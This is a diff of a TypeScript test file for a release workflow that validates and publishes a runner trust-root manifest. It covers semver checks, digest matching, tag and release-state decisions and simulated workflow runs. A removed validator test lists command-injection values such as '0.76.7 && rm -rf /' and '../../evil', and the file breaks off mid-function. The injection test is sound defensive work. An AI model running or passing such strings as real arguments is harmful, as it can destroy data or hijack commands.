@@ -1,14 +1,13 @@
-// The runner trust root (runner-manifest.json) rotted at v0.75.2 while releases
-// shipped through v0.76.7: the publish job pushed a [skip ci] commit straight to
-// a protected main (GH006, "Build & Test" is expected) and the detect gate keyed
-// only on release-asset presence, so the never-landed manifest was never retried
-// and every later run reported success. These tests pin both halves of the fix.
+// The release trust-root transaction: the first default-branch commit that
+// advertises plugin version V must already carry runner-manifest.json for V,
+// its named zips must already be public at vV with the producer's exact
+// digests and lengths, and nothing rebuilds or replaces those bytes afterwards.
 //
-// The publication decision is tested through its exported functions; the delivery
-// path is tested by EXECUTING the workflow's steps the way the runner does (its
-// own default shell, one process per step, abort on failure) against a real local
-// git remote and a recording `gh` double, then asserting the resulting refs,
-// commits, release assets and CLI call sequence.
+// The publication decision is tested through its exported functions; the
+// workflow legs are tested by EXECUTING their steps the way the runner does
+// (its own default shell, one process per step, abort on failure) against a
+// real local git remote and a recording `gh` double, then asserting the
+// resulting refs, releases, tags, uploads and CLI call sequence.
 
 import test from 'node:test';
 import assert from 'node:assert/strict';
@@ -27,9 +26,11 @@ import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import {
+  assertPreparedCandidate,
+  assertVersion,
   decideRunnerPublication,
   expectedRunnerAssets,
-  manifestBranchName,
+  isNewerVersion,
 } from '../../../../scripts/runner-manifest-publication.mts';
 import {
   ghCommands,
@@ -37,212 +38,371 @@ import {
   loadWorkflow,
   runJobSteps,
   shellCommands,
+  type GhCheckRun,
   type GhPullRequest,
+  type GhSeedRelease,
   type GhStub,
+  type JobRun,
+  type Workflow,
   type WorkflowStep,
 } from '../helpers/workflow-job-runner.ts';
 
 const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..', '..');
-const workflowPath = join(repoRoot, '.github', 'workflows', 'runner-artifacts.yml');
-const workflow = loadWorkflow(workflowPath);
+const release = loadWorkflow(join(repoRoot, '.github', 'workflows', 'release.yml'));
+const artifacts = loadWorkflow(join(repoRoot, '.github', 'workflows', 'runner-artifacts.yml'));
+const ci = loadWorkflow(join(repoRoot, '.github', 'workflows', 'ci.yml'));
+const sweepWorkflow = loadWorkflow(
+  join(repoRoot, '.github', 'workflows', 'runner-artifacts-sweep.yml'),
+);
 
+const ADVERTISED = '0.76.6';
 const VERSION = '0.76.7';
 const TAG = `v${VERSION}`;
-const BRANCH = `chore/runner-manifest-v${VERSION}`;
 const IOS_ZIP = `rn-fast-runner-${VERSION}-sim.zip`;
 const ANDROID_ZIP = `rn-android-runner-${VERSION}.zip`;
 const IOS_BYTES = 'ios-runner-zip-bytes';
 const ANDROID_BYTES = 'android-runner-zip-bytes';
+const SHA_A = 'a'.repeat(40);
+const SHA_B = 'b'.repeat(40);
+const REPO = 'Lykhoyda/rn-dev-agent';
 
-function steps(jobId: string): WorkflowStep[] {
-  return workflow.jobs[jobId].steps ?? [];
+function sha256(content: string): string {
+  return createHash('sha256').update(Buffer.from(content)).digest('hex');
 }
 
-function everyStep(): Array<{ jobId: string; step: WorkflowStep }> {
-  return Object.entries(workflow.jobs).flatMap(([jobId, job]) =>
-    (job.steps ?? []).map((step) => ({ jobId, step })),
+function producer() {
+  return {
+    ios: { sha256: sha256(IOS_BYTES), bytes: IOS_BYTES.length },
+    android: { sha256: sha256(ANDROID_BYTES), bytes: ANDROID_BYTES.length },
+  };
+}
+
+// The manifest scripts/build-runner-manifest.mts produces for the seeded zips,
+// serialised the way it writes the file.
+function manifestFor(version = VERSION, ios = IOS_BYTES, android = ANDROID_BYTES): string {
+  return (
+    JSON.stringify(
+      {
+        version,
+        assets: {
+          ios: [
+            { name: `rn-fast-runner-${version}-sim.zip`, sha256: sha256(ios), bytes: ios.length },
+          ],
+          android: [
+            {
+              name: `rn-android-runner-${version}.zip`,
+              sha256: sha256(android),
+              bytes: android.length,
+            },
+          ],
+        },
+      },
+      null,
+      2,
+    ) + '\n'
   );
 }
 
-const COMPLETE_RELEASE = [IOS_ZIP, ANDROID_ZIP, 'runner-manifest.json'];
+function candidate(overrides: Record<string, unknown> = {}) {
+  const manifest = manifestFor();
+  return {
+    candidateSha: SHA_A,
+    pluginVersion: VERSION,
+    advertisedVersion: ADVERTISED,
+    repoManifest: manifest,
+    hostManifests: { claude: manifest, codex: manifest },
+    producer: producer(),
+    ...overrides,
+  };
+}
 
-function manifestFor(version: string, sha = 'a'.repeat(64)): string {
-  return JSON.stringify({
-    version,
-    assets: {
-      ios: [{ name: `rn-fast-runner-${version}-sim.zip`, sha256: sha, bytes: 1 }],
-      android: [{ name: `rn-android-runner-${version}.zip`, sha256: sha, bytes: 2 }],
+function published(overrides: Record<string, unknown> = {}) {
+  return {
+    ...candidate(),
+    release: {
+      isDraft: false,
+      targetCommitish: SHA_A,
+      tagName: TAG,
+      assets: [{ name: IOS_ZIP }, { name: ANDROID_ZIP }, { name: 'runner-manifest.json' }],
     },
-  });
+    tagSha: SHA_A,
+    publishedManifest: manifestFor(),
+    ...overrides,
+  };
 }
 
-// --- stale-manifest detection ---
+// --- the prepared candidate ---
 
-test('a complete release with a stale in-repo manifest still needs publication', () => {
-  const decision = decideRunnerPublication({
-    pluginVersion: VERSION,
-    releaseAssets: COMPLETE_RELEASE,
-    repoManifest: manifestFor('0.75.2'),
-    publishedManifest: manifestFor(VERSION),
-  });
-  assert.equal(decision.publishManifest, true, 'the v0.75.2 trust root must be re-delivered');
-  assert.equal(
-    decision.buildRunners,
-    false,
-    'the release already carries both zips — do not rebuild',
-  );
-  assert.match(decision.reason, /stale/);
-});
-
-test('a manifest that matches the published one for this version is already current', () => {
-  const current = manifestFor(VERSION);
-  const decision = decideRunnerPublication({
-    pluginVersion: VERSION,
-    releaseAssets: COMPLETE_RELEASE,
-    repoManifest: current,
-    publishedManifest: current,
-  });
-  assert.equal(decision.publishManifest, false);
-  assert.equal(decision.buildRunners, false);
-});
-
-test('property order never decides publication', () => {
-  const ordered = JSON.stringify({
-    version: VERSION,
-    assets: { ios: [{ name: 'x', sha256: 'y', bytes: 1 }], android: [] },
-  });
-  const reordered = JSON.stringify({
-    assets: { android: [], ios: [{ bytes: 1, sha256: 'y', name: 'x' }] },
-    version: VERSION,
-  });
-  const decision = decideRunnerPublication({
-    pluginVersion: VERSION,
-    releaseAssets: COMPLETE_RELEASE,
-    repoManifest: ordered,
-    publishedManifest: reordered,
-  });
-  assert.equal(decision.publishManifest, false, 'reordered keys would re-open a PR every sweep');
-});
-
-test('same version but drifted digests counts as stale', () => {
-  const decision = decideRunnerPublication({
-    pluginVersion: VERSION,
-    releaseAssets: COMPLETE_RELEASE,
-    repoManifest: manifestFor(VERSION, 'b'.repeat(64)),
-    publishedManifest: manifestFor(VERSION, 'c'.repeat(64)),
-  });
-  assert.equal(decision.publishManifest, true);
-});
-
-test('a missing or unparseable in-repo manifest is stale, never assumed current', () => {
-  for (const repoManifest of [null, '', 'not json', '[]']) {
-    const decision = decideRunnerPublication({
-      pluginVersion: VERSION,
-      releaseAssets: COMPLETE_RELEASE,
-      repoManifest,
-      publishedManifest: manifestFor(VERSION),
-    });
-    assert.equal(decision.publishManifest, true, `repoManifest=${JSON.stringify(repoManifest)}`);
-  }
-});
-
-test('a release missing a runner zip rebuilds and republishes', () => {
-  const decision = decideRunnerPublication({
-    pluginVersion: VERSION,
-    releaseAssets: [IOS_ZIP],
-    repoManifest: manifestFor(VERSION),
-    publishedManifest: manifestFor(VERSION),
-  });
-  assert.equal(decision.buildRunners, true);
-  assert.equal(decision.publishManifest, true);
-});
-
-test('a release with both zips but no published manifest asset republishes', () => {
-  const decision = decideRunnerPublication({
-    pluginVersion: VERSION,
-    releaseAssets: [IOS_ZIP, ANDROID_ZIP],
-    repoManifest: manifestFor(VERSION),
-    publishedManifest: null,
-  });
-  assert.equal(decision.buildRunners, false);
-  assert.equal(decision.publishManifest, true);
-});
-
-// --- the trust root may only ever track the installed plugin version ---
-
-test('force_version re-publishes the current version, skipping the missing-assets check', () => {
-  const current = manifestFor(VERSION);
-  const decision = decideRunnerPublication({
-    pluginVersion: VERSION,
-    forceVersion: VERSION,
-    releaseAssets: COMPLETE_RELEASE,
-    repoManifest: current,
-    publishedManifest: current,
-  });
-  assert.equal(decision.version, VERSION);
-  assert.equal(decision.buildRunners, true);
-  assert.equal(decision.publishManifest, true);
-});
-
-test('a historical force_version is refused instead of downgrading the trust root', () => {
-  const current = manifestFor(VERSION);
-  assert.throws(
-    () =>
-      decideRunnerPublication({
-        pluginVersion: VERSION,
-        forceVersion: '0.76.5',
-        releaseAssets: [],
-        repoManifest: current,
-        publishedManifest: current,
-      }),
-    /does not match the current plugin version/,
-    'a v0.76.5 trust root would send every v0.76.7 client back to the local build',
-  );
-});
-
-test('an operator-supplied force_version that is not a release version is rejected', () => {
-  for (const bad of ['main', '0.76.7 && rm -rf /', '../../evil', 'v0.76.7', '01.2.3', '1.2.3-01']) {
-    assert.throws(
-      () =>
-        decideRunnerPublication({
-          pluginVersion: VERSION,
-          forceVersion: bad,
-          releaseAssets: COMPLETE_RELEASE,
-          repoManifest: manifestFor(VERSION),
-        }),
-      /not a release version|does not match the current plugin version/,
-      `accepted force_version ${JSON.stringify(bad)}`,
-    );
-  }
-  assert.throws(() => manifestBranchName('main; echo'), /not a release version/);
-  assert.throws(() => manifestBranchName('1.2.3-alpha..1'), /not a release version/);
-});
-
-test('the manifest branch is a pure function of the version, so reruns converge', () => {
-  assert.equal(manifestBranchName(VERSION), BRANCH);
-  assert.notEqual(manifestBranchName(VERSION), manifestBranchName('0.76.8'));
-  const decision = decideRunnerPublication({
-    pluginVersion: VERSION,
-    releaseAssets: COMPLETE_RELEASE,
-    repoManifest: manifestFor('0.75.2'),
-    publishedManifest: manifestFor(VERSION),
-  });
-  assert.equal(decision.branch, BRANCH);
-});
-
-test('expected release asset names stay pinned to the client download contract', () => {
-  assert.deepEqual(expectedRunnerAssets(VERSION), {
+test('a self-consistent candidate matching the producer handoff is prepared', () => {
+  const prepared = assertPreparedCandidate(candidate());
+  assert.equal(prepared.version, VERSION);
+  assert.deepEqual(prepared.expected, {
     ios: IOS_ZIP,
     android: ANDROID_ZIP,
     manifest: 'runner-manifest.json',
   });
 });
 
-// --- executable workflow simulation ---
+test('a candidate must advertise a version newer than main', () => {
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ advertisedVersion: VERSION })),
+    /not newer/,
+  );
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ advertisedVersion: '0.77.0' })),
+    /not newer/,
+  );
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ advertisedVersion: undefined })),
+    /not a release version/,
+  );
+});
+
+test('version precedence follows semver, including numeric prerelease identifiers', () => {
+  assert.equal(isNewerVersion('1.0.9', '1.0.8'), true);
+  assert.equal(isNewerVersion('1.0.8', '1.0.8'), false);
+  assert.equal(isNewerVersion('1.0.8', '1.0.9'), false);
+  assert.equal(isNewerVersion('1.1.0', '1.0.9'), true);
+  assert.equal(isNewerVersion('1.0.9', '1.0.9-rc.1'), true);
+  assert.equal(isNewerVersion('1.0.9-rc.1', '1.0.9'), false);
+  assert.equal(isNewerVersion('1.0.9-beta.10', '1.0.9-beta.2'), true);
+  assert.equal(isNewerVersion('1.0.9-beta.2', '1.0.9-beta.10'), false);
+  assert.equal(isNewerVersion('1.0.9-beta.2', '1.0.9-alpha.9'), true);
+  assert.equal(isNewerVersion('1.0.9-beta', '1.0.9-beta.1'), false);
+  assert.equal(isNewerVersion('1.0.9-rc.1', '1.0.9-1'), true);
+});
+
+test('the trust root must vouch for exactly the candidate version', () => {
+  const stale = manifestFor(ADVERTISED);
+  assert.throws(
+    () =>
+      assertPreparedCandidate(
+        candidate({ repoManifest: stale, hostManifests: { claude: stale, codex: stale } }),
+      ),
+    /trust root is v0\.76\.6 while plugin\.json is v0\.76\.7/,
+  );
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ repoManifest: 'not json' })),
+    /missing or unparseable/,
+  );
+});
+
+test('both host copies must be present and identical to the root', () => {
+  const manifest = manifestFor();
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ hostManifests: { claude: manifest } })),
+    /codex runner-manifest\.json copy is missing/,
+  );
+  assert.throws(
+    () =>
+      assertPreparedCandidate(
+        candidate({ hostManifests: { claude: manifest, codex: manifestFor(VERSION, 'x') } }),
+      ),
+    /codex runner-manifest\.json copy .* differs/,
+  );
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ hostManifests: undefined })),
+    /claude runner-manifest\.json copy is missing/,
+  );
+});
+
+test('property order never decides identity of the host copies', () => {
+  const reordered = JSON.stringify({ assets: JSON.parse(manifestFor()).assets, version: VERSION });
+  assert.doesNotThrow(() =>
+    assertPreparedCandidate(
+      candidate({ hostManifests: { claude: reordered, codex: manifestFor() } }),
+    ),
+  );
+});
+
+test('the full pair with exact names is required', () => {
+  const parsed = JSON.parse(manifestFor());
+  const noAndroid = JSON.stringify({ ...parsed, assets: { ios: parsed.assets.ios, android: [] } });
+  assert.throws(
+    () =>
+      assertPreparedCandidate(
+        candidate({
+          repoManifest: noAndroid,
+          hostManifests: { claude: noAndroid, codex: noAndroid },
+        }),
+      ),
+    /exactly one android asset/,
+  );
+  const renamed = manifestFor().replace(IOS_ZIP, 'rn-fast-runner-latest-sim.zip');
+  assert.throws(
+    () =>
+      assertPreparedCandidate(
+        candidate({ repoManifest: renamed, hostManifests: { claude: renamed, codex: renamed } }),
+      ),
+    /ios asset is rn-fast-runner-latest-sim\.zip, expected rn-fast-runner-0\.76\.7-sim\.zip/,
+  );
+});
+
+test('the trust root must carry the producer handoff digests and lengths exactly', () => {
+  const tampered = { ...producer(), ios: { sha256: sha256('other'), bytes: IOS_BYTES.length } };
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ producer: tampered })),
+    /ios digest .* does not match the producer handoff/,
+  );
+  const short = {
+    ...producer(),
+    android: { sha256: sha256(ANDROID_BYTES), bytes: ANDROID_BYTES.length - 1 },
+  };
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ producer: short })),
+    /android digest .* does not match/,
+  );
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ producer: { ios: producer().ios } })),
+    /no producer handoff identity for android/,
+  );
+  assert.throws(
+    () =>
+      assertPreparedCandidate(
+        candidate({ producer: { ...producer(), ios: { sha256: 'abc', bytes: 1 } } }),
+      ),
+    /not a SHA-256/,
+  );
+  assert.throws(
+    () =>
+      assertPreparedCandidate(
+        candidate({ producer: { ...producer(), ios: { sha256: sha256(IOS_BYTES), bytes: '' } } }),
+      ),
+    /not a positive byte count/,
+  );
+});
+
+test('a candidate is identified by a full commit SHA', () => {
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ candidateSha: 'main' })),
+    /not a full commit SHA/,
+  );
+  assert.throws(
+    () => assertPreparedCandidate(candidate({ candidateSha: SHA_A.slice(0, 7) })),
+    /not a full commit SHA/,
+  );
+});
+
+test('only exact SemVer releases are accepted as versions', () => {
+  for (const bad of ['1.2', '01.2.3', '1.2.3-01', '1.2.3-alpha..1', 'v1.2.3', '', undefined]) {
+    assert.throws(() => assertVersion(bad), /not a release version/);
+  }
+  assert.equal(assertVersion('1.2.3-rc.1'), '1.2.3-rc.1');
+});
+
+test('expected release asset names stay pinned to the client download contract', () => {
+  assert.deepEqual(expectedRunnerAssets('1.0.9'), {
+    ios: 'rn-fast-runner-1.0.9-sim.zip',
+    android: 'rn-android-runner-1.0.9.zip',
+    manifest: 'runner-manifest.json',
+  });
+});
+
+// --- deciding against the release state ---
+
+test('an unreadable release state is never read as "no release"', () => {
+  assert.throws(() => decideRunnerPublication(candidate()), /could not be determined/);
+  assert.throws(
+    () => decideRunnerPublication(candidate({ release: undefined })),
+    /could not be determined/,
+  );
+  assert.throws(
+    () => decideRunnerPublication(candidate({ release: { isDraft: false } })),
+    /not a release listing/,
+  );
+});
+
+test('no release and no tag means publish', () => {
+  const decision = decideRunnerPublication(candidate({ release: null, tagSha: null }));
+  assert.equal(decision.action, 'publish');
+});
+
+test('a tag already bound to another commit refuses both a fresh publication and a draft rebuild', () => {
+  assert.throws(
+    () => decideRunnerPublication(candidate({ release: null, tagSha: SHA_B })),
+    /already points at b{40}, not the candidate/,
+  );
+  assert.throws(
+    () =>
+      decideRunnerPublication(
+        candidate({
+          release: { isDraft: true, targetCommitish: SHA_A, assets: [] },
+          tagSha: SHA_B,
+        }),
+      ),
+    /already points at/,
+  );
+  assert.equal(
+    decideRunnerPublication(candidate({ release: null, tagSha: SHA_A })).action,
+    'publish',
+  );
+});
+
+test('a draft is prepublication state and is replaced from the retained bytes', () => {
+  for (const target of [SHA_A, SHA_B]) {
+    const decision = decideRunnerPublication(
+      candidate({
+        release: { isDraft: true, targetCommitish: target, assets: [{ name: IOS_ZIP }] },
+        tagSha: null,
+      }),
+    );
+    assert.equal(decision.action, 'replace-draft');
+  }
+});
+
+test('a release already published from this exact candidate is a no-op retry', () => {
+  const decision = decideRunnerPublication(published());
+  assert.equal(decision.action, 'already-public');
+  const reordered = JSON.stringify({ assets: JSON.parse(manifestFor()).assets, version: VERSION });
+  assert.equal(
+    decideRunnerPublication(published({ publishedManifest: reordered })).action,
+    'already-public',
+  );
+});
+
+test('a published release that diverges is refused, never replaced', () => {
+  const cases: Array<[Record<string, unknown>, RegExp]> = [
+    [{ tagSha: SHA_B }, /published from b{40}, not the candidate/],
+    [
+      { tagSha: null, release: { ...published().release, targetCommitish: SHA_B } },
+      /published from b{40}/,
+    ],
+    [
+      {
+        release: {
+          ...published().release,
+          assets: [{ name: IOS_ZIP }, { name: 'runner-manifest.json' }],
+        },
+      },
+      /without both runner zips/,
+    ],
+    [
+      { release: { ...published().release, assets: [{ name: IOS_ZIP }, { name: ANDROID_ZIP }] } },
+      /without its runner-manifest\.json/,
+    ],
+    [{ publishedManifest: null }, /could not be read/],
+    [
+      { publishedManifest: manifestFor(VERSION, 'replacement-bytes') },
+      /differs from the candidate/,
+    ],
+  ];
+  for (const [overrides, expected] of cases) {
+    assert.throws(() => decideRunnerPublication(published(overrides)), expected);
+    assert.throws(
+      () => decideRunnerPublication(published(overrides)),
+      /published-but-not-advertised.*new version/,
+    );
+  }
+});
+
+// --- executing the workflow legs ---
 
 type Fixture = {
   root: string;
   origin: string;
+  base: string;
+  candidate: string;
+  head: string | null;
   gh: GhStub;
   cleanup: () => void;
 };
@@ -270,182 +430,148 @@ function write(root: string, relative: string, content: string): void {
   writeFileSync(path, content);
 }
 
+const MANIFEST_PATHS = [
+  'runner-manifest.json',
+  'packages/codex-plugin/runner-manifest.json',
+  'packages/claude-plugin/runner-manifest.json',
+];
+
 type FixtureOptions = {
-  pluginVersion?: string;
-  repoManifest?: string;
-  releaseAssets?: Record<string, string>;
+  // Also commit the generated trust root onto the candidate: the release head H.
+  prepared?: boolean;
+  candidateExtraFiles?: Record<string, string>;
+  releases?: Record<string, GhSeedRelease>;
+  tags?: Record<string, string>;
+  checks?: Record<string, GhCheckRun[]>;
   prs?: GhPullRequest[];
-  supersededBranches?: string[];
-  manifestBranchFiles?: Record<string, string>;
 };
 
 function createFixture(options: FixtureOptions = {}): Fixture {
-  const root = mkdtempSync(join(tmpdir(), 'runner-manifest-workflow-'));
+  const root = mkdtempSync(join(tmpdir(), 'release-trust-root-'));
   const origin = join(root, 'origin.git');
   const seed = join(root, 'seed');
   git(root, 'init', '--quiet', '--bare', '--initial-branch=main', origin);
 
   mkdirSync(seed);
   git(seed, 'init', '--quiet', '--initial-branch=main');
+  write(seed, 'packages/claude-plugin/plugin.json', `{"version": "${ADVERTISED}"}\n`);
   write(
     seed,
-    'packages/claude-plugin/plugin.json',
-    `{"version": "${options.pluginVersion ?? VERSION}"}\n`,
+    'packages/claude-plugin/package.json',
+    `{"name": "rn-dev-agent-plugin", "version": "${ADVERTISED}"}\n`,
   );
-  const stale = options.repoManifest ?? manifestFor('0.75.2') + '\n';
-  for (const path of [
-    'runner-manifest.json',
-    'packages/codex-plugin/runner-manifest.json',
-    'packages/claude-plugin/runner-manifest.json',
-  ]) {
-    write(seed, path, stale);
-  }
-  // Unrelated tracked file: a manifest commit must never carry anything else.
+  write(
+    seed,
+    'packages/claude-plugin/CHANGELOG.md',
+    `# rn-dev-agent-plugin\n\n## ${ADVERTISED}\n\n### Patch Changes\n\n- older change\n`,
+  );
+  for (const path of MANIFEST_PATHS)
+    write(seed, path, manifestFor(ADVERTISED, 'old-ios', 'old-android'));
+  write(seed, 'packages/rn-fast-runner/README.md', 'ios runner sources\n');
+  write(seed, 'packages/rn-android-runner/README.md', 'android runner sources\n');
   write(seed, 'README.md', 'unrelated repository content\n');
+  write(seed, '.changeset/pending.md', "---\n'rn-dev-agent-plugin': patch\n---\n\nA change.\n");
   for (const script of [
     'build-runner-manifest.mts',
     'runner-manifest-publication.mts',
     'release-notes-from-changelog.sh',
+    'check-public-runner-assets.sh',
   ]) {
     mkdirSync(join(seed, 'scripts'), { recursive: true });
     copyFileSync(join(repoRoot, 'scripts', script), join(seed, 'scripts', script));
   }
   git(seed, 'add', '-A');
   git(seed, 'commit', '--quiet', '-m', 'seed');
+  const base = git(seed, 'rev-parse', 'HEAD').trim();
   git(seed, 'remote', 'add', 'origin', `file://${origin}`);
   git(seed, 'push', '--quiet', 'origin', 'main');
-  for (const branch of options.supersededBranches ?? []) {
-    git(seed, 'push', '--quiet', 'origin', `main:refs/heads/${branch}`);
-  }
-  if (options.manifestBranchFiles) {
-    // Someone with write access pushes onto the workflow-owned manifest branch.
-    git(seed, 'checkout', '--quiet', '-b', BRANCH);
-    for (const [path, content] of Object.entries(options.manifestBranchFiles)) {
-      write(seed, path, content);
-    }
+
+  // What `corepack yarn version-packages` generates: one commit on top of main.
+  git(seed, 'checkout', '--quiet', '-b', 'changeset-release/main');
+  write(seed, 'packages/claude-plugin/plugin.json', `{"version": "${VERSION}"}\n`);
+  write(
+    seed,
+    'packages/claude-plugin/package.json',
+    `{"name": "rn-dev-agent-plugin", "version": "${VERSION}"}\n`,
+  );
+  write(
+    seed,
+    'packages/claude-plugin/CHANGELOG.md',
+    `# rn-dev-agent-plugin\n\n## ${VERSION}\n\n### Patch Changes\n\n- abc1234: A change.\n\n## ${ADVERTISED}\n\n### Patch Changes\n\n- older change\n`,
+  );
+  rmSync(join(seed, '.changeset/pending.md'));
+  for (const [path, content] of Object.entries(options.candidateExtraFiles ?? {}))
+    write(seed, path, content);
+  git(seed, 'add', '-A');
+  git(seed, 'commit', '--quiet', '-m', 'chore(release): version packages');
+  const candidateSha = git(seed, 'rev-parse', 'HEAD').trim();
+  let head: string | null = null;
+  if (options.prepared) {
+    for (const path of MANIFEST_PATHS) write(seed, path, manifestFor());
     git(seed, 'add', '-A');
-    git(seed, 'commit', '--quiet', '-m', 'unrelated work pushed onto the manifest branch');
-    git(seed, 'push', '--quiet', 'origin', BRANCH);
-    git(seed, 'checkout', '--quiet', 'main');
+    git(seed, 'commit', '--quiet', '-m', `chore(release): runner trust root for v${VERSION}`);
+    head = git(seed, 'rev-parse', 'HEAD').trim();
   }
+  git(seed, 'push', '--quiet', 'origin', 'changeset-release/main');
+  git(seed, 'checkout', '--quiet', 'main');
 
   const gh = installGhStub(root, {
-    releases: options.releaseAssets && {
-      [TAG]: options.releaseAssets,
-    },
+    releases: options.releases,
+    tags: options.tags,
+    checks: options.checks,
     prs: options.prs,
     nextPr: 11,
     gitDir: origin,
   });
-  return { root, origin, gh, cleanup: () => rmSync(root, { force: true, recursive: true }) };
-}
-
-let advanceCounter = 0;
-
-function advanceMain(fixture: Fixture, path: string, content: string): void {
-  const dir = join(fixture.root, `advance-${advanceCounter++}`);
-  git(fixture.root, 'clone', '--quiet', `file://${fixture.origin}`, dir);
-  write(dir, path, content);
-  git(dir, 'add', '-A');
-  git(dir, 'commit', '--quiet', '-m', 'unrelated work on main');
-  git(dir, 'push', '--quiet', 'origin', 'main');
-}
-
-function checkout(fixture: Fixture, name: string): string {
-  const dir = join(fixture.root, name);
-  // actions/checkout's default: a single-branch shallow clone of the target ref.
-  git(
-    fixture.root,
-    'clone',
-    '--quiet',
-    '--depth',
-    '1',
-    '--single-branch',
-    '--branch',
-    'main',
-    `file://${fixture.origin}`,
-    dir,
-  );
-  return dir;
-}
-
-function publishContext(overrides: Record<string, string> = {}): Record<string, string> {
   return {
-    'needs.detect.outputs.version': VERSION,
-    'needs.detect.outputs.branch': BRANCH,
-    'needs.detect.outputs.build': 'false',
-    'secrets.GITHUB_TOKEN': 'stub-token',
-    'github.repository': 'Lykhoyda/rn-dev-agent',
-    ...overrides,
+    root,
+    origin,
+    base,
+    candidate: candidateSha,
+    head,
+    gh,
+    cleanup: () => rmSync(root, { force: true, recursive: true }),
   };
 }
 
-function runPublish(
-  fixture: Fixture,
-  {
-    workdir,
-    env = {},
-    ctx = {},
-  }: { workdir: string; env?: Record<string, string>; ctx?: Record<string, string> },
-) {
-  return runJobSteps({
-    workflow,
-    jobId: 'publish-manifest',
-    cwd: workdir,
-    ctx: publishContext(ctx),
-    env: {
-      ...fixture.gh.env,
-      GIT_CONFIG_GLOBAL: '/dev/null',
-      GIT_CONFIG_SYSTEM: '/dev/null',
-      GIT_TERMINAL_PROMPT: '0',
-      ...env,
-    },
-  });
+let cloneCounter = 0;
+
+// actions/checkout at a ref: a shallow single-branch clone (or a detached SHA).
+function checkout(fixture: Fixture, ref: string): string {
+  const dir = join(fixture.root, `checkout-${cloneCounter++}`);
+  if (/^[0-9a-f]{40}$/.test(ref)) {
+    git(fixture.root, 'clone', '--quiet', `file://${fixture.origin}`, dir);
+    git(dir, 'checkout', '--quiet', '--detach', ref);
+  } else {
+    git(
+      fixture.root,
+      'clone',
+      '--quiet',
+      '--depth',
+      '1',
+      '--single-branch',
+      '--branch',
+      ref,
+      `file://${fixture.origin}`,
+      dir,
+    );
+  }
+  return dir;
 }
 
-const DETECT_CTX = {
-  'secrets.GITHUB_TOKEN': 'stub-token',
-  'github.repository': 'Lykhoyda/rn-dev-agent',
-  'github.event.inputs.force_version': '',
-};
-
-function runDetect(fixture: Fixture) {
-  return runJobSteps({
-    workflow,
-    jobId: 'detect',
-    cwd: checkout(fixture, 'detect'),
-    ctx: DETECT_CTX,
-    env: fixture.gh.env,
-    only: ['Decide what this run must build and publish'],
-  });
+function fullClone(fixture: Fixture): string {
+  const dir = join(fixture.root, `clone-${cloneCounter++}`);
+  git(fixture.root, 'clone', '--quiet', `file://${fixture.origin}`, dir);
+  return dir;
 }
 
-function completeRelease(): Record<string, string> {
-  return { [IOS_ZIP]: IOS_BYTES, [ANDROID_ZIP]: ANDROID_BYTES };
-}
-
-// The manifest scripts/build-runner-manifest.mts produces for the seeded zips,
-// serialised the way it writes the file.
-function currentManifest(): string {
-  return (
-    JSON.stringify(
-      {
-        version: VERSION,
-        assets: {
-          ios: [{ name: IOS_ZIP, sha256: sha256(IOS_BYTES), bytes: IOS_BYTES.length }],
-          android: [
-            { name: ANDROID_ZIP, sha256: sha256(ANDROID_BYTES), bytes: ANDROID_BYTES.length },
-          ],
-        },
-      },
-      null,
-      2,
-    ) + '\n'
-  );
-}
-
-function sha256(content: string): string {
-  return createHash('sha256').update(Buffer.from(content)).digest('hex');
+function advanceMain(fixture: Fixture): string {
+  const dir = fullClone(fixture);
+  write(dir, 'README.md', `unrelated work on main ${cloneCounter}\n`);
+  git(dir, 'add', '-A');
+  git(dir, 'commit', '--quiet', '-m', 'unrelated work on main');
+  git(dir, 'push', '--quiet', 'origin', 'main');
+  return git(dir, 'rev-parse', 'HEAD').trim();
 }
 
 function originRef(fixture: Fixture, ref: string): string | null {
@@ -453,1277 +579,1544 @@ function originRef(fixture: Fixture, ref: string): string | null {
     fixture.root,
     '--git-dir',
     fixture.origin,
-    'for-each-ref',
-    '--format=%(objectname)',
-    `refs/heads/${ref}`,
+    'rev-parse',
+    '--verify',
+    '--quiet',
+    ref,
   ).trim();
   return out === '' ? null : out;
 }
 
-const BRANCH_STEP = 'Reuse or recreate the version-keyed manifest branch';
-
-function stepStdout(run: { steps: Array<{ name: string; stdout: string }> }, name: string): string {
-  const step = run.steps.find((s) => s.name === name);
-  assert.ok(step, `the job never ran the step "${name}"`);
-  return step.stdout;
+function handoff(dir: string, ios = IOS_BYTES, android = ANDROID_BYTES): void {
+  write(dir, `handoff/${IOS_ZIP}`, ios);
+  write(dir, `handoff/${ANDROID_ZIP}`, android);
 }
 
 function ghCalls(fixture: Fixture): string[] {
   return ghCommands(fixture.gh.calls());
 }
 
-test('a stale trust root is delivered by a manifest branch and PR, never by touching main', () => {
-  const fixture = createFixture({ releaseAssets: completeRelease() });
+function baseEnv(fixture: Fixture): Record<string, string> {
+  return {
+    ...fixture.gh.env,
+    GIT_CONFIG_GLOBAL: '/dev/null',
+    GIT_CONFIG_SYSTEM: '/dev/null',
+    GIT_TERMINAL_PROMPT: '0',
+    GIT_AUTHOR_NAME: 'fixture',
+    GIT_AUTHOR_EMAIL: 'fixture@example.com',
+    GIT_COMMITTER_NAME: 'fixture',
+    GIT_COMMITTER_EMAIL: 'fixture@example.com',
+    GITHUB_STEP_SUMMARY: join(fixture.root, 'summary.md'),
+  };
+}
+
+const HEAD_EXPR =
+  "needs.version.outputs.resume == 'true' && needs.version.outputs.head-sha || needs.finalize.outputs.head-sha";
+
+function releaseCtx(
+  fixture: Fixture,
+  overrides: Record<string, string> = {},
+): Record<string, string> {
+  const head = fixture.head ?? '';
+  const p = producer();
+  return {
+    'secrets.GITHUB_TOKEN': 'stub-token',
+    'github.repository': REPO,
+    'github.sha': fixture.base,
+    'github.run_id': '4242',
+    'needs.version.outputs.candidate-sha': fixture.candidate,
+    'needs.version.outputs.version': VERSION,
